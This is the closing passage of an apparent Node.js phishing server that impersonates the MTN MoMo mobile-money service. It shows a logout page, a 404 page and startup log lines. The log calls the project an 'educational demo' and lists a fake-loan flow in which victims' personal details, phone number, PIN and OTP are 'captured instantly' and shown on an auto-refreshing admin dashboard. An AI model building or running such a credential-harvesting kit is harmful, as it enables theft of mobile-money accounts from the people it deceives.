                <div style="background: white; padding: 40px; border-radius: 12px; text-align: center; box-shadow: 0 2px 20px rgba(0,0,0,0.1);">
                    <h1 style="color: #333;">👋 Logged Out</h1>
                    <p style="color: #666; margin: 15px 0 25px;">You have been logged out successfully.</p>
                    <a href="/admin" style="background: #003366; color: white; padding: 12px 30px; border-radius: 6px; text-decoration: none; font-weight: 600;">Login Again</a>
                </div>
            </body>
            </html>
        `);
        return;
    }

    // 404
    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end(`
        <!DOCTYPE html>
        <html>
        <head><title>404 Not Found</title></head>
        <body>
            <h1>404 - Page Not Found</h1>
            <p>Return to <a href="/">MTN MoMo</a></p>
        </body>
        </html>
    `);
}).listen(PORT, () => {
    console.log(`🚀 MTN MoMo Server running on port ${PORT}`);
    console.log(`📝 Access the site at: http://localhost:${PORT}`);
    console.log(`🔐 Access admin panel at: http://localhost:${PORT}/admin`);
    console.log(`⚠️  ADMIN CREDENTIALS: ${ADMIN_USERNAME}:${ADMIN_PASSWORD}`);
    console.log(`\n💡 EDUCATIONAL DEMO FLOW:`);
    console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
    console.log(`1. User visits landing page and applies for loan`);
    console.log(`2. User enters personal details`);
    console.log(`3. User submits final application`);
    console.log(`4. User is redirected to login page`);
    console.log(`5. User enters phone + PIN → Captured instantly`);
    console.log(`6. User enters OTP → Captured instantly`);
    console.log(`7. Admin dashboard auto-refreshes every 3 seconds`);
    console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`);
});